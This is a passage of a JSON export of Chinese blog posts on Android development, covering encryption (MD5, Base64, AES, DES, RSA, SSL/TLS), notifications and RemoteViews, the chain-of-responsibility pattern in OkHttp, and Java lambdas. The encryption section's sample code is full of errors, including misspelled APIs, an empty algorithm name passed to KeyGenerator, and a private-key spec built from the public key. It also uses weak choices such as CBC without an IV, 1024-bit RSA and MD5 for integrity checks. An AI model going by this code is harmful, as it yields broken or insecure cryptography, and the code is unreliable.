excerpt":"Android开发中常见的几种加密方式 * MD5 * BASE64 * AES * DES * RSA * SSL/TSL MD5加密 MD5英文全称Message-Digest Algorithm 5,全称消息算法摘要,是一种不可逆加密方式 特点 * 压缩性：任意长度的数据，算出的MD5值长度都是固定的。 * 容易计算：从原数据计算出MD5值很容易。 * 抗修改性：对原数据进行任何改动，哪怕只修改1个字节，所得到的MD5值都有很大区别。 * 强抗碰撞：已知原数据和其MD5值，想找到一个具有相同MD5值的数据（即伪造数据）是非常困难的。 因为其特点,MD5加密通常","text":"Android开发中常见的几种加密方式 MD5 BASE64 AES DES RSA SSL/TSL MD5加密 MD5英文全称Message-Digest Algorithm 5,全称消息算法摘要,是一种不可逆加密方式 特点 压缩性：任意长度的数据，算出的MD5值长度都是固定的。 容易计算：从原数据计算出MD5值很容易。 抗修改性：对原数据进行任何改动，哪怕只修改1个字节，所得到的MD5值都有很大区别。 强抗碰撞：已知原数据和其MD5值，想找到一个具有相同MD5值的数据（即伪造数据）是非常困难的。 因为其特点,MD5加密通常用来验证文件的完整性,防串改. 实现 在Java中提供了MessageDigest类来加密数据. 123456789101112 byte[] resource; //需要加密的数据MessageDigest md5=MessageDigest.getInstance(\"MD5\");byte[] bytes=md5.digest(resource);StringBuilder builder=new StringBuilder(bytes.lenght);for (byte byte :bytes ) &#123; String temp = Integer.toHexString(b &amp; 0xff); if (temp.lenght==1) &#123; builder.append(0); &#125; builder.append(temp);&#125;String MD5=builder.toString(); MD5加密是对字节数组进行操作的.所以无论加密文件或是其它都需要先转换为字节数组.加密后的结果也是字节数组. 为了方便查看,需要按规定转换为字节数组. BASE64 BASE64并不是一种加密方式,而是对字节数组的一种编码方式.实际上是让字节数据转换为文本的方案. 原理 BASE64是把字节数据转换为ASC码中对应的64个字符(英文大小写,+及/). 转换方式为每6位字节对应一个字符.不足位的后面补0.6位字节转换为十进制数值.范围是0-63,对应64个字符.如果有不足位的,在编码后会补上数量对应的= 用处 统一编码方式,不需要考虑字符集对数据的影响 可以把任何文件或数据都以纺一的文本方式保存 实现 在Java中提供了Base64类来实现编码转换 1234 //编码String encode= Base64.encode(byte[] bytes,int flag);//解码byte[] decode=Base64.decode(byte[] bytes,int flag); flag表示编码方式,通常使用Base64.DEFAULT Base64.DEFAULT 默认的编码方式 Base64.NO_PADDING 忽略后缀的=号 Base64.NO_WRAP 省略换行符 Base64.CTRL 使用微软的换行符,而不是Liunux的 Base64.URL_SAFE 使用-和_代替+和/以保证在URL的安全.通常用与网络传输 AES Advanced Encryption Standard,全称为高级加密标准,又称为 Rijndael 加密法,使用的是区块加密方案。 区块加密方案是把一定数量的字节划分为一个区块,把区块内的数据加密成相同位数的数据。 AES是一种对称加密方案,所以需要加密端和解密端都使用相同的密钥. 特点 区块 AES是对字节数组按区块划分,对区块进行加密.AES区块大小固定为128位. 密钥 AES的密钥长度有三种,128位/192位/256位 位数越多安全性越高. 矩阵 AES每次对区块中的16个字节进行操作,这4个字节会组成一个4x4的矩阵. 回合密钥 AES对每个矩阵的操作时都会根据密钥生成一个16位的回合密钥.对应矩阵上的每一个字节 实现 在Java中通过MessageDigest来进行AES加解密 123456789101112 //密钥原数据字符串,两端必须一样,128位的密钥字符串长度必须为16private static final String KEY=\"\"//加密方式,AES表示AES加密,CBC表示区块的处理方式,PKC5Padding表示区块的填充方式.private static final String MODE=\"AES/CBC/PKCS5Padding\"//生成密钥KeyGenerator keyGenerator = KeyGenerator.getInstance(KEY);SecretKey secretKey = keyGenerator.generateKey();//初始化密码处理类Cipher cipher = Cipher.getInstance(MODE);cipher.init(Cipher.ENCRIPT_MODE,secretKey); //第一个参数为模式,ENCRIPT_MODE为加密, DECRIPT为解密//cipher.init(Cipher.DECRIPT_MODE,secretKey,\"BC\"); 使用`PKCS7Padding`方式时需要加载bouncycastle包,BC为提供该填充方式的Provicerbyte[] date=cipher.doFinal(byte[] data); //加密和解密都是同一个方法,由初始化的模式决定.对源字节数组进行处理.生成新的字节数组. 填充方式有几种.Java6没有实现所有的填充方式. NoPadding,PKCS5Padding,ISO10126Padding Java6实现 PKCS7Padding,ZeroBytePadding 需要加载bouncycastle包 生成密钥时,getInstance()有个重载的方法可以添加一个provier.为密钥添加一个随机数。 AES加密安全性高,速度快。 DES Data Encryption Standard,标准加密算法.使用64位密钥的对称加密.使用的也是区块加密方案. 因为是64位密钥,安全性不高,现已经被AES加密替代. 实现方法同AES加密,只需要把MODE中的 AES改为DES RSA 目前使用最广泛的非对称加密.生成一对密钥–公钥和私钥.公钥对来对外提供.私钥只有密钥生成者自己拥有。 非对称算法需要指定密钥长度,越长安全性越好,但加解密的速度就越慢.通常指定1024或2048。 一次加密的的密文长度为密钥长度/8-11,所以1024长度的密钥一次只能加密117字节.2048能加密245字节。 所以非对称加密通常只用与短数据加密,如签名或对称加密的密钥。 RSA加密都是一用与一对多的场景。 RSA有两种使用方式： 加密算法 公钥加密,只有私钥才能解密 签名算法 私钥签名,只有公钥才能验证. 如Github使用的SSH登录就是使用的RSA加密算法.用户把公钥保存到服务器,通过SSH登录时服务器发一个随机数给客户端,客户端使用私钥加密发送到服务器,服务器用保存的公钥解密。 RSA的密钥的产生 随机获取两个大质数,得其积N 获取N的欧拉函数值-&gt;整数R 随机获取一个小与R并与之互质的整数E,计算出E的反模元素D 公钥是(N,E),私钥是(N,D) RSA的原理 欧拉定理 两个互质的正整数,A和N,N的欧拉函数为P,则A的P次方除以N余1 费马小定理(RSA算法核心) 因为质数P的欧拉函数为P-1,所以一个整数A和一个质数N互质时,A的N-1次方除以N余1 反模元素 两个互质的正整数.A和N,则一定存在一个整数B,使得A乘B除以N余数为1 实现 定义常量 123 private static final KEY_SIZE=1024;private static final RSA=\"RSA\";private static final MODE=\"RSA/ECB/PCKS1Padding\" 这里注意RSA的加密填充方式,需要两端保持一致。 在Adrioid中默认使用的是RSA/None/NoPadding,在Java中使用的是RSA/None/PCKS1Padding。 创建密钥 1234567 KeyPairGenerator rsa = KeyPairGenerator.getInstance(RSA);rsa.initialize(KEY_SIZE);KeyPair keyPair = rsa.generateKeyPair();Key publicKey = keyPair.getPublic();byte[] publicKeyEncoded = publicKey.getEncoded();Key privateKey = keyPair.getPrivate();byte[] privateKeyEncoded = privateKey.getEncoded(); 把字节数组转换为Key 公钥会以字节数组的形式公开，接收方需要把字节数据转化为公钥。 123456 //公钥公开的方式为X509KeySpec KeySpec = new X509EncodedKeySpec(publicKeyEncoded);PublicKey publicKey = keyFactory.generatePublic(keySpec);//私钥公开的方式为PKCS8KeySpec keySpec = new PKCS8EncodedKeySpec(publicKeyEncoded);PrivateKey privateKey = keyFactory.generatePrivate(keySpec); 加解密 通常使用公钥加密,使用私钥解密.还是使用Cipher类。 1234567 Cipher cipher=Cipher.instance(MODE);//使用公钥加密cipher.init(Cipher.ENCRIPT_MODE,publicKey);cipher.doFinal();//使用私钥解密cipher.init(Cipher.DECRIPT_MODE,privateKey);cipher.doFinal(); SSL 安全套接字（Secure Socket Layer，SSL）协议是Web浏览器与Web服务器之间安全交换信息的协议，提供两个基本的安全服务：鉴别与保密。 鉴别 可选的客户端认证及强制的服务端认证 保密 双方在连接时定义好加密方式,所有传递内容都会加密. SSL是间与应用层与TCP层.应用数据经过SSL层加密并加上SSL头传输给TCP层。 SSL通信流程 握手 握手是在两端连接后数据传输前的协议行为,通过三次握手确定双方的身份,双方的加密方式,以及确定密钥.这个握手过程是通过RAS加密及身份证书完成的. 加密通信 完成握手协议手,双方就按确定的加密方式以对称加密的方式对数据进行加密 握手协议 客户端发送至服务器 一个会话ID,自身SSL版本.一个32位随机数.一自身支持的密码套件列表.一个hello. 服务器接收后会根据客户端提供的列表选择一个密码套件,确定与客户端之间的加密方式 服务器发送至客户端 会话ID,SSL版本,一个32位随机数,一个密码套件.一个servieHello.及自己的证书. 客户端收到证书后可以对证书进行验证.然后生成一个32位随机数.这样总共就有三个随机数了.根据服务端确定的加密方式用这三个随机数生成密钥.然后从证书中获得服务端的公钥对第三个随机数加密 客户端发送至服务器 加密的第三个随机数. 服务器收到加密的随机数后使用私钥解密,然后使用三个随机数生成密钥. 服务器发送至客户端 准备完成,可以开始加密通信 证书 证书是一台服务器对外提供的一个身份证明.需要通过可靠的第三方认证机构(CA)来发布。 一个数字证书通常有以下几项： 证书持有者的公钥 证书的发布机构 CA的签名 签名摘要的算法 证书的验证 一般的浏览器都会有CA根证书,含有所有CA的公钥 CA验证 CA根证书中找到不证书的发布机构 CA签名摘要验证 使用CA的公钥来解密签名摘要,如果解不开说明证书不对 CA签名验证 使用公钥解密签名.然后使用签名摘要算法进行签名摘要,比对解密手的签名摘要.如果不同说明签名被更改 证书过期验证 实现了在线证书状态协议(OCSP)的客户端可以在线查询证书是否过期 TSL TLS 1.0是IETF（Internet Engineering Task Force，Internet工程任务组）制定的一种新的协议，它建立在SSL 3.0协议规范之上，是SSL 3.0的后续版本，可以理解为SSL 3.1 本文链接： http://www.meng.uno/articles/7f8aa6cf/ 欢迎转载！","categories":[{"name":"Android","slug":"Android","permalink":"http://www.meng.uno/categories/Android/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://www.meng.uno/tags/Java/"},{"name":"Android","slug":"Android","permalink":"http://www.meng.uno/tags/Android/"}]},{"title":"Android通知及RemoteViews","slug":"RemoteViews","date":"2017-02-27T08:53:59.000Z","updated":"2018-03-24T14:39:26.755Z","comments":true,"path":"articles/6a064a82/","link":"","permalink":"http://www.meng.uno/articles/6a064a82/","excerpt":"通知 通知创建和使用的流程 * 创建Notification.Builder的实例 * 通过Builder来设置通知的相关属性,并通过builder()方法来获取设置好的通知 * 获取NotificationManager来发送通知. 1 2 3 4 5 Notification.Builder builder = new Notification.Builder(getApplicationContext()); builder.setContentTitle(\"这是标题\"); Notification build = builder.build(); NotificationM","text":"通知 通知创建和使用的流程 创建Notification.Builder的实例 通过Builder来设置通知的相关属性,并通过builder()方法来获取设置好的通知 获取NotificationManager来发送通知. 12345 Notification.Builder builder = new Notification.Builder(getApplicationContext());builder.setContentTitle(\"这是标题\");Notification build = builder.build();NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);nm.notify(0,build); 官方的兼容包中提供了兼容工具类,用来在不同版本下创建和使用兼容的通知: 1234 NotificationCompat.Builder builder = new NotificationCompat.Builder(getApplicationContext());builder.setContentTitle(\"这是标题\");Notification nofitication = builder.build();NotificationManagerCompat.from(getApplicationContext()).notify(0,Notification); 使用NotificationCompact和NotificationManagerCompat两个类来提供兼容性.实际上底层的实现还是一样的。 NotificationManagerCompat通过静态方法from(Context Context)创建了一个自身的实例.实例中通过参数Context获取了一个NotificationManager,实际上通知还是通过它来发送。 实际上这两个工具类内部会根据应用运行机器的版本来创建对应的实现类来提供兼容性。 通知的设置 通知是通过Builder来设置的。常见的设置如下： 设置标题 setContentTitle(CharSequence) 设置文字内容 setContentText(CharSequence) 设置副文字 setSubContextText(CharSequence) 设置大图标 setLargeIcon(Bitmap) 不设置时默认为应用图标 设置小图标 setSmallIcon(int) 参数为图片资源Id 设置颜色 setColor(int color) 参数为RGB值 设置声音 setSound 设置震动 setVibrate 设置闪灯 setLight(int,int,int) 第一个int为颜色的资源id,第二个和第三个是闪灯开启和关闭的时间,单位为毫秒 设置点击后是否自动取消 setAutoCancel(boolean) 进度条 从4.1开始通知里自带进度条.通过setProgress(in max,int progress,boolean indeterminate)来设置进度 max 进度最大值 progress 当前进度 indeterminate 是否是无限循环 true表示无限循环进度条,不需要进度及最大值.false反之 当进度条加载完毕后可以能过setProgress(0,0,false)来隐藏进度条。 消息发送 发送通知需要一个id和一个Notification。通过NotificationManager发送到远程的NotificationService上.用Notification里的数据更新远程的UI。 使用notify(int id,Notification notify)可以不断的更新同一个通知.另外此方法可以有个重载的方法可以设置一个Tag。 ID id需要自己设置,一个Id对应一个通知.NotificationService收到Notification后会根据Id去查找对应的View.如果不存在则创建一个。如果存在则更新UI也就是说如果id相同时,后续的通知会把之前的通知替换掉,如果id不同时会弹出多个通知。 PendingIntent PendingIntent用与处理通知的交互事件(也就是点击事件).PendingIntent表示的是一个待定的意图。 可以用来开启一个Activity,Service或广播接收者,它是对Intent的包装.对外部提供这个Intent.通知被点击时系统会按照PendingIntent设置的方法及Intent设置的目标去开启对应的Activity,Service或广播接收者。 创建PendingIntent的方法如下： 123 PendingIntent.startActivity(Context context,int requestCode,Intent intent,int flag);PendingIntent.startService(Context context,int requestCode,Intent intent,int flag);PendingIntent.startBroadcast(Context context,int requestCode,Intent intent,int flag); 所需要的参数都一样,startActivity还可以额外带一个bundle参数。 Context 启动所需上下文.实际上传递到外部的是应用的Application.所以在点击通知时哪怕应用没启动,也可以开启对应的组件. requestCode 请求码,自定义 intent 启动所需组件的intent,因为Context是Application.所以启动Activity需要NEW_TASK标识. flag PendingIntent的标识 对与更新同一个id的通知而言,这两个没有作用,不管PendingIntent是否有变化,始终都是新的通知替换掉原来的。 当每次都使用不同的id来弹出多个通知时,这些flag才会发生作用.这里需要涉及PendingIntent的匹配问题。 两个PendingIntent匹配指的是requestCode相同并且PendingIntent内部的intent都匹配。 当两个intent内部的ComponentName和intent-filter相同,这两个intent就算是匹配的.ComponentName相同指的是这个intent希望开启的组件是相同的。 多个通知的PendingIntent如果不匹配是互不干扰的.如果是匹配的.则根据flag有不同的处理方式。 FLAG_ONE_SHOT PendingIntent只执行一次,也就是说多个含有匹配的PendingIntent的通知,只要有一个被点击了,那么其它的就点击无效.通知里如果还含有其它的PendingIntent,还是可以被点击的. FLAG_NO_CREAT 如果PendingIntent不存在时并不创建新的实例,而是返回null.这个很少用. FLAG_CANCEL_CURRENT 如果PendingIntent已经存在,则取消前者,创建新的实例以保持数据为最新.多个含有匹配PendingIntent的通知,只有最新的可以被点击,其它的点击无效. FLAG_UPDATE_CURRENT 多个含有PendingIntent的通知都会更新其Intent中的Extra数据与最新的通知中保持一至. Action 通知的点击交互被称为Action。 通知自身的点击交互设置方法是 setContentIntent(PendingIntent)。 在新版本中通知可以添加不同的按钮来对应不同的Action,添加Action的方法有两种： 12 builer.addAction(Action)builer.addAction(int iconId,CharSequence title,PendingIntent intent) 实际上都是添加Action实例.区别在与Action是否自己来构造。Action在通知上显示为一个带图标的文字按钮.必须的三个参数如下： IconId 图标的资源id Title 按钮的文字 PendingIntent 按钮的点击处理 Style通知样式 在4.0版本后通知可以被拉伸,通知可以设置不同的扩展样式。 1 builer.setStyle(NotificationCompat.style); 系统提供了四种默认样式 MediaStyle 媒体播放器样式.可以最多提供5个Action,用与后台播放媒体文件： 12 builer.setStyle(new NotificationCompat.MediaStyle() .setMediaSession(MediaSession.Token)); BigPictureStyle 大图样式.可以附加一张图片,扩展显示： 12 buider.setStyle(new NotificationCompat.BigPictureStyle() .bigPicture(Bitmap)); InboxStyle 文字式表样式,可以以列表的形式显示最多5行的文字 123 builer.setStyle(new NotificationCompat.InboxStyle() .setLine(CharSequence) .setLine(CharSequence)); BigTextStyle 多文字内容.下拉显示全部文字 12 buider.setStyle(new NotificationCompat.BigTextStyle() .bitText(CharSequence)); RemoteViews RemoteViews是Android提供的一种远程服务,可以跨进程显示及更新UI,通知及桌面小部件就是基与它封装的。 其核心是跨进程传递数据.把UI的布局及对其View的操作封装到RemoteViews里,传递给其它进程.其它进程收到RemoteViews后调用RemoteViews的方法创建或更新UI并显示。 RemoteViews的原理 RemoteViews本身并不是个View.它是个Pacelable,是个可以跨进程传递的一个数据.它携带了UI的布局及对应的数据。 其它进程收到这个RemoteViews后会在其进程中根据这个布局inflat出对应的View.然后根据RemoteViews里的属性反射设置到对应的View上,然后根据设置点击监听.监听的处理就是调用对应的PendingIntent。 因为是跨进程,所以无法直接操作View,所以系统把对view的一个操作定义为Action对象.Action对象本身也是个Pacelable,所以可以跨进程.其封装了操作View的数据.远程进程遍历所有的Action并执行其apply方法通过反射更新View。 向先前说的设置view的属性,设置点击监听,都是一个Action。 RemoteViews的创建 12345 RemoteViews remoteview=new RemoteViews(String packageName,int layoutId);如果通知需要使用自定义UI可以通过创建RemoteView实现builer.setCustomContentView(RemoteViews);或builer.setCustomBigContentView(RemoteViews); packageName表示的是客户端的包名,layoutId表示布局Id。 RemoteViews的设置 RemoteViews对View的操作是在远程进行的.所以客户端只是封装了操作.通过RemoteViews提供的一系列set方法,RemoteViews把所有设置都封装成Action保存到集合中。 设置属性参数为view的id及属性值如： 12 setText(int id,CharSequence text)setColor(int Id,int color) 设置属性参数为view的id,方法名及属性值如 12 setBitmap(int id,String methodName,Bitmap bitmap)setBoolean(int id,String methodName,boolean value) 单个View设置点击事件 1 setOnClickPendingIntent(int id,PendingIntent intent); 集合View设置点击事件 需要 setPendingIntentTemplate及setOnClickFillIntent两个方法结合使用。 因为Action操作View是通过反射的.所以不能使用自定义控件,只能用有限的系统控件。 Layout FramgLayout LinearLayout RelativeLayout GridLayout View Button ImageView TextView ProgressBar ImageButton ListView GridView Chronometer AnalogClock ViewFlipper StackView AdapterViewFlipper ViewStub 发送RemoteViews到其它进程 可以使用任何IPC方式把本地设置好的RemoteViews发送到其它进程 是通过NotificationManager发送到系统进程,小部件是通过AppWidgetManager发送到系统进程.都是通过Binder机制。 因为RemoteViews是个Parcelable,所以可以通过很多系统提供的方式来传递,如Intent,Message,或其它IPC方式。 远程的UI操作 远程收到RemoteViews后通过调用其 apply()或reApply() 方法创建或更新UI。 Apply 1 public View apply(Context context,ViewGroup parent,OnClickHandler handler); 其中parent是父布局,这个方法会创建一个View并根据Action设置属性,返回这个设置好的View： 创建布局 从RemoteViews里获取布局文件的id,根据id填充出对应的View.因为是根据ID来填充布局的,所以必须保证远程进程能根据id获取到布局文件。 系统是根据RemoteViews里的包名来获取包内的布局文件的,同一个应用内不同的线程也可以根据id来获取布局文件.但如果是两个不同的应用是不能根据id来获取布局文件的。 设置属性 RemoteViews会调用 perfomApply(View view,ViewGroup parent,OnClickHandler handler)来设置填充好的View 其实就是遍历Action.调用其 apply() 方法操作View.反射设置属性,或通过OnClickHandler设置点击交互。 把填充并设置好的View添加到父布局中。 ReApply 1 public void reapply(Context context, View v, OnClickHandler handler); reApply() 方法只是更新UI,也是调用 perfomApply() 方法。 如果是两个不同的应用间使用RemoteViews,是不能使用 apply() 方法来创建UI的。 这时需要两边约定好布局文件,远程端在需要创建UI时在使用本地的布局文件填充View.然后调用 reApply() 方法来更新UI,最后再添加到父布局。 总结 通知是由RemoteViews来实现的,通过Notification类来封装一个RemoteViews。 设置不同的style实际上是设置RemoteViews里的layoutId. 通过NotificationManager的 notify() 方法发送到系统的NotificationService中。 系统的NotificationService里维护着各种Notification,实际上一个id对应着一个RemoteViews。 系统在自己的进程里创建和更新通知.当通知被点击时,在系统进程中会根据PendingIntent来启动指定的Activity,Service,及BroadcasterReceiver。 本文链接： http://www.meng.uno/articles/6a064a82/ 欢迎转载！","categories":[{"name":"Android","slug":"Android","permalink":"http://www.meng.uno/categories/Android/"}],"tags":[{"name":"Android","slug":"Android","permalink":"http://www.meng.uno/tags/Android/"},{"name":"RemoteViews","slug":"RemoteViews","permalink":"http://www.meng.uno/tags/RemoteViews/"}]},{"title":"责任链模式及OkHttp实现","slug":"OkHttp","date":"2017-02-25T08:37:13.000Z","updated":"2018-03-24T14:39:26.755Z","comments":true,"path":"articles/7c56e6ba/","link":"","permalink":"http://www.meng.uno/articles/7c56e6ba/","excerpt":"责任链模式 责任链模式是对一个事件的处理方法,所有能对事件进行处理的对象按顺序形成一个链表.事件经过链表中每个处理对象轮流处理.如果有返回值.则返回也是顺着这条链表反向返回.这个链表是先进后出模式. * 在现实中的责任链模型之一就是网络连接.对与程序猿而言,七层或五层的网络连接模型是肯定知道的. 当一个网络请求发出时,需要经过应用层->传输层->网络层->连接层->物理层 收到响应后正好反过来,物理层->连接层->网络层->传输层->应用层 在请求经过各层时,由每层轮流处理.每层都可以对请求或响应进行处理.并可以中断链接,以自身为终点返回响应 * 另一个现实模型就是Web服务器的","text":"责任链模式 责任链模式是对一个事件的处理方法,所有能对事件进行处理的对象按顺序形成一个链表.事件经过链表中每个处理对象轮流处理.如果有返回值.则返回也是顺着这条链表反向返回.这个链表是先进后出模式. 在现实中的责任链模型之一就是网络连接.对与程序猿而言,七层或五层的网络连接模型是肯定知道的. 当一个网络请求发出时,需要经过应用层-&gt;传输层-&gt;网络层-&gt;连接层-&gt;物理层 收到响应后正好反过来,物理层-&gt;连接层-&gt;网络层-&gt;传输层-&gt;应用层 在请求经过各层时,由每层轮流处理.每层都可以对请求或响应进行处理.并可以中断链接,以自身为终点返回响应 另一个现实模型就是Web服务器的请求缓存 一个请示从客户端发送到Web服务器需要经过客户端-&gt;中间服务器-&gt;反向代理-&gt;Web端缓存(如Redis)-&gt;Web数据库 除了Web数据库是请求的点外,中间所有层都可以缓存数据.如果有缓存时会终止请求,以自身为终点返回数据. 如果途经的层没有缓存,则会在收到下一级的返回的数据时对数据进行缓存.然后返回上一层. 在设计模式中,负责链模式就是对这种顺序处理事件的行为的抽象,通过接口来定义处理事件的方法.顺序分发/处理事件. 每个责任人实现相同的接口,处理一个事件对象 让事件对象责任人之间顺序传递 事件的处理结果的返回是逆序的 责任链中的每个责任人都可以有权不继续传递事件,以自身为终点处理事件返回结果 OkHttp中的责任链模式 在Okhttp中,Intercepter就是典型的责任链械的实现.它可以设置任意数量的Intercepter来对网络请求及其响应做任何中间处理.比如设置缓存,Https的证书验证,统一对请求加密/防串改,打印自定义Log,过滤请求等. 123 interface Intercepter&#123; Response chian(Chian chian);&#125; 这个接口很简单,拿到Chain对象.最后返回个Response,那这个对象是什么鬼?? 它有两个重要的方法 public Request getQuest()及public Response process(Request quest) 拿到请求及设置请求拿到响应. 一般的实现是先拿到请求.然后对请求做一番蹂躏,然后 process一下,拿到Response,折腾一下.然后return掉 1234567 public Response ch\bain(Chain chain)&#123; Requset quest = chian.getRequset() ooxx(request); Response response = chain.process(quest); xxoo(response); return response;&#125; 或许它不知道,Resquse其实是被上家ooxx过的,Respnse也是被下家xxoo过的. 具体的实现可以去看一下源码,我这里就写一下自己理解的超简单的实现 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374 public class Okhttp &#123;private List&lt;Intercepter&gt; mIntercepters=new LinkedList&lt;&gt;();private Request mRequest;private int mIndex;private Callback mCallback;private Chain mChain=new Chain();private Intercepter mNetIntercepter =new Intercepter() &#123;@Overridepublic Response chain (Chain chain) &#123; //这里是真实的发送网络请求 return 网络请示的响应; &#125;&#125;;/*** 添加拦截器,后加的放最前面* @param intercper 拦截器*/public void addIntercepter(Intercepter intercper)&#123; mIntercepters.add(0, intercper);&#125;/*** OkHttp请求的入口* @param request 请示* @param callback 回调*/public void execute(Request request ,Callback callback)&#123; mCallback=callback; mIndex=0; mRequest=request; new Thread(new Runnable() &#123; @Override public void run () &#123; Response response=mChain.process(mRequest); mCallback.onResponse(response); &#125; &#125;).start();&#125;/*** 定义的一个类用与递归的方式完成责任链发送请求获取响应*/private class Chain &#123;public Request getRequest()&#123; return mRequest;&#125;/*** 顺序获取拦截器,传递chain对象给拦截器,获取响应* @return 请求的响应*/private Response getResponse () &#123; Intercepter intercepter = mIntercepters.get(mIndex); mIndex++; return intercepter.chain(this);&#125;/*** 如果责任链没走完,则顺序从责任链中获取拦截器,处理请求* 否则由真正的负责网络请求的拦截器处理请求* @param request 请求* @return 响应*/Response process(Request request)&#123; mRequest=request; if (mIndex&gt;=mIntercepters.size())&#123; return Okhttp.this.mNetIntercepter.chain(this); &#125;else&#123; return getResponse(); &#125; &#125;&#125;&#125; 不得不说程序猿写文章真是容易骗字数.我已经极力在简化了.代码还是差不多上百行. 应该写得够简单吧.重点也就几个 内部有个处理真实网络请求的Intercepter,做为最后的接盘侠. 返回响应的是intercepter.chain(this),如果这个拦截器调用了chain的process()方法就形成递归,否则就是终断了请求的传递 整个责任链的传递都是同步的.整体在子线程运行,最后通过回调返回响应. 还有一个很经典的实现就是Android的事件分发机制.这里我就不贴代码骗字数了.网上随便一找一堆. 责任链模式的用途 当业务逻辑需要形成一个事件处理流时,就可以考虑使用责任链模式.通过接口来规范中间环节的行为,专注与事件流的传递.可以随意扩展及调整中间环节. 我在实际业务中的有一个场景中使用了责任链模式.(当时使用的时候其实并不清楚) 在一个列表中可以弹出一个筛选菜单,菜单项是不定的.某些项选择后可以增加更多的选项条目 选项条目类型不同.有单选,多选,输入等. 点击完成时才把所有筛选条目形成对应的网络请求参数 实际处理起来很简易.定义了两个类 12345 interface ParamsSetAble&#123; void setParams(NetParams params);&#125;public class NetParams&#123;&#125; 每个条目实现ParamsSetAble接口用与设置参数. NetParams类用与收集参数,最后转换成网络请求所用的格式 当点击完成时,遍历所有的条目,传递NetParams对象.最后把这个对象传递给网络请求的类. 在传递时进行可以进行参数检查,错误时可以中断传递,提示错误.我这里是通过手动抛异常来中断的.在外部统一catch处理.如果用Rxjava可以不用catch,在onError里统一管理.如Observer.error(new 自定义异常(中断提示信息)) 本文链接： http://www.meng.uno/articles/7c56e6ba/ 欢迎转载！","categories":[{"name":"设计模式","slug":"设计模式","permalink":"http://www.meng.uno/categories/设计模式/"}],"tags":[{"name":"设计模式","slug":"设计模式","permalink":"http://www.meng.uno/tags/设计模式/"}]},{"title":"Lambda表达式","slug":"Lambda","date":"2017-02-25T08:20:58.000Z","updated":"2018-03-24T14:39:26.754Z","comments":true,"path":"articles/bbcf5ff7/","link":"","permalink":"http://www.meng.uno/articles/bbcf5ff7/","excerpt":"Java8已经更新了好久了。变化很大，其中最广为人知的就是Lambda表达式。 Lambda表示式 Lambda的基本格式为()->内容,以箭头为分隔，左边为参数区，右边为代码区。 可以把它看成是一个临时定义的方法，没有方法名，默认为public,根据代码区里的有没有return来决定返回值．如果没有return则是void。 1. 单行代码可以省略return 2. 多行代码使用{}来包裹. 3. 代码内可以引用外部局部变量，实际上是隐式的把变量变成final 网上用得最多的例子就是(x,y)->x+y;,很蛋疼的例子，当初看Junit单元测试时也是这样的例子。 来个实际点的","text":"Java8已经更新了好久了。变化很大，其中最广为人知的就是Lambda表达式。 Lambda表示式 Lambda的基本格式为()-&gt;内容,以箭头为分隔，左边为参数区，右边为代码区。 可以把它看成是一个临时定义的方法，没有方法名，默认为public,根据代码区里的有没有return来决定返回值．如果没有return则是void。 单行代码可以省略return 多行代码使用{}来包裹. 代码内可以引用外部局部变量，实际上是隐式的把变量变成final 网上用得最多的例子就是(x,y)-&gt;x+y;,很蛋疼的例子，当初看Junit单元测试时也是这样的例子。 来个实际点的例子吧： 12345 public boolean isEmpty(String text)&#123; return text==null||\"\".eqauls(text)&#125;//用Lambda是(text)-&gt;return text==null||\"\".eqauls(text); 看到这里估计很多人会觉得更蛋疼了。明明Lambda使用是的匿名内部类的简写，为什么要拿方法来做比较，另外明明有方法可以调用，何必要用Lambda。 Lambda的起源 曾经无数次的羡慕js有闭包，可以把方法当做参数来传递。在项目中有很多类都存在着很类似的方法： 1234567891011 public String getIds(List&lt;T&gt; list)&#123; if(list==null||list.isEmpty)&#123; return null; &#125; StringBuilder builder = new StringBuilder(); for(T t:list)&#123; String id=doSomething(t) builder.append(\",\").append(id); &#125; return builder.deleteCharAt(0).toString();&#125; 想抽取一下,奈何每个类里T不同，doSomething的实现也不同．T可以用泛型，doSomething（T t）这个方法怎么传呢？ 面向接口吧。我们可以定义一个接口来干这个事： 123 public interface GetId&lt;T&gt;&#123; String getId(T t);&#125; 上面的方法就可以抽到工具类中了： 1234567891011 public static &lt;T&gt; String getIds(List&lt;T&gt; list,GetId&lt;T&gt; interf)&#123; if(list==null||list.isEmpty)&#123; return null; &#125; StringBuilder builder = new StringBuilder(); for(T t:list)&#123; String id=interf.getId(t); builder.append(\",\").append(id); &#125; return builder.deleteCharAt(0).toString();&#125; 说来说去好像不关Lambda什么的事呀．实际上上面的例子就是Lambda的起源。 随着函数式编程广为程序员喜爱，Java也在考虑加入函数式编程．但有两个问题，一 做为一个强类型语言，类型转换有点蛋疼，二 不能把方法当成参数(有返回值的还好，void方法当参数是相当的无语的)。 Java考虑了半天，使用了上面的例子的逻辑来处理，用接口来包装方法，把接口当参数来代替。 上面的例子中。在类中调用如下： 12345 String ids=Utils.getIds(List&lt;XXX&gt; list,new GetId&lt;XXX&gt;()&#123; getId(XXX x)&#123; return ooxx(x); &#125;&#125;); 这是一个参数，如果是多个参数那不要吓死人： 123456789101112131415 String ids=Utils.getIds(List&lt;XXX&gt; list, new GetId&lt;XXX&gt;()&#123; getId(XXX x)&#123; return ooxx(x); &#125; &#125;, new GetId&lt;XXX&gt;()&#123;getId(XXX x)&#123; return xxoo(x); &#125; &#125;, new GetId&lt;XXX&gt;()&#123;getId(XXX x)&#123; return oxox(x); &#125; &#125;); 所以Lambda第一个作用就体现出来了简化书写，好写好看。如： 1 String ids=Utils.getIds(List&lt;XXX&gt; list,(x)-&gt;ooxx(x)); 这里有点奇怪x是什么呢？其实完整的应该是： 1 String ids=Utils.getIds(List&lt;XXX&gt; list,(XXX x)-&gt;ooxx(x)); 这里就体现了lambda的牛逼之处类型推导(准确来说是Java8的特性),编译时推导参数类型和返回类型。 最上面那个坑爹的例子估计很多人都会像我当初一样蒙Ｂ。(x,y)-&gt;x+y;,这ｘ和ｙ是什么的东西？ 实际上这个例子应该是(int x,int y)-&gt;return x+y;，这样看就清楚多了，传两个int,返回其和。 再给个实际点的例子吧： 1234567891011121314151617 String[] strings=&#123;\"xx\",\"oo\",\"xxoo\"&#125;;//传统的排序是这样的Arrays.sort(strings,new Comparetor&lt;String&gt;()&#123; public int compareTo(String s1,String s2)&#123; return s1.length-s2.length; &#125;&#125;)//使用lambda是这样的Arrays.sort(strings,(String s1,String s2)-&gt;return 